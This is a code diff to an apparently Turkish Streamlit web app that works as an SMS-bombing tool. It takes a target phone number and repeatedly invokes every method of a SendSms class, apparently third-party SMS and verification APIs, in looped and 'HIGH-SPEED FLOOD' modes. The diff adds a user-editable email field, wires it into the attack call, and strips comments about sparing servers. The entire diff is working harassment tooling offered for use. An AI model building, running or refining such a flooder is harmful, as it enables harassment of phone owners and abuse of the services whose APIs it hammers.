@@ -194,8 +194,9 @@ st.markdown('<div class="ana-siber-aciklama">Advanced Multi-Agent Network Warfar
 if "saldiri_aktif" not in st.session_state:
     st.session_state.saldiri_aktif = False
 
+# Giriş Alanları
 numara_input = st.text_input("HEDEF KOORDİNAT (TELEFON NUMARASI):", placeholder="Örn: 5051234567")
-gizli_mail = "arexzy_panel@gmail.com"
+mail_input = st.text_input("E-POSTA ADRESİ (ZORUNLU PROTOKOL):", placeholder="Örn: test@gmail.com", value="arexzy_panel@gmail.com")
 
 mod = st.selectbox(
     "OPERASYON MODÜLÜ SEÇİNİZ:",
@@ -235,6 +236,8 @@ if not st.session_state.saldiri_aktif:
     if st.button("SİSTEMİ TETİKLE / BAŞLAT ⚡", use_container_width=True):
         if not numara_input:
             st.error("INTEGRITY ERROR: Hedef numara veritabanı boş bırakılamaz.")
+        elif not mail_input:
+            st.error("INTEGRITY ERROR: E-posta alanı boş bırakılamaz. Kodun çalışması için bu parametre zorunludur.")
         elif mod == "Seçim Yapınız...":
             st.error("INTEGRITY ERROR: Yürütülecek operasyonel algoritma seçilmedi.")
         else:
@@ -247,6 +250,7 @@ if not st.session_state.saldiri_aktif:
             else:
                 st.session_state.saldiri_aktif = True
                 st.session_state.temiz_numara = cleaned_number
+                st.session_state.girilen_mail = mail_input
                 st.session_state.secilen_mod = mod
                 st.session_state.miktar = miktar
                 st.rerun()
@@ -259,13 +263,15 @@ if st.session_state.saldiri_aktif:
         st.rerun()
 
     target_no = st.session_state.temiz_numara
+    target_mail = st.session_state.girilen_mail
     selected_sub_mod = st.session_state.secilen_mod
     
     log_slot_1 = st.empty()
     log_slot_2 = st.empty()
 
     try:
-        sms_instance = SendSms(target_no, gizli_mail)
+        # 🚨 KRİTİK DÜZELTME: hem numara hem de mail parametreleri tam olarak sms.py'nin istediği sıra ile gönderiliyor!
+        sms_instance = SendSms(target_no, target_mail)
         api_methods_pool = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__')]
 
         ekranı_temizle()
@@ -281,7 +287,7 @@ if st.session_state.saldiri_aktif:
                         log_slot_1.markdown(terminal_logu_uret(f"API Veri Paketi Gönderildi -> [{specific_method_name.upper()}]", "success"), unsafe_allow_html=True)
                     except:
                         pass
-                    time.sleep(0.05) # Sunucunun şişmesini önlemek için ideal bekleme süresi
+                    time.sleep(0.05)
                 log_slot_2.markdown(terminal_logu_uret(f"Döngü Tamamlandı: [{current_loop_idx+1}/{loop_limit}]", "warn"), unsafe_allow_html=True)
             st.session_state.saldiri_aktif = False
             st.success("SUCCESS: Döngü başarıyla tamamlandı.")
@@ -300,7 +306,7 @@ if st.session_state.saldiri_aktif:
                         pass
                 log_slot_1.markdown(terminal_logu_uret(f"HIGH-SPEED FLOOD: Atak döngüsü #{turbo_counter} aktif.", "success"), unsafe_allow_html=True)
                 log_slot_2.markdown(terminal_logu_uret(f"SPOOFED PIPELINE: Paketler arka arkaya maskelenerek basılıyor.", "warn"), unsafe_allow_html=True)
-                time.sleep(0.1) # Sunucu koruması için döngü arası hafif nefes payı
+                time.sleep(0.1)
 
     except Exception as fatal_exception:
         st.markdown(terminal_logu_uret(f"CRITICAL MATRIX FALLBACK: {str(fatal_exception)}", "danger"), unsafe_allow_html=True)
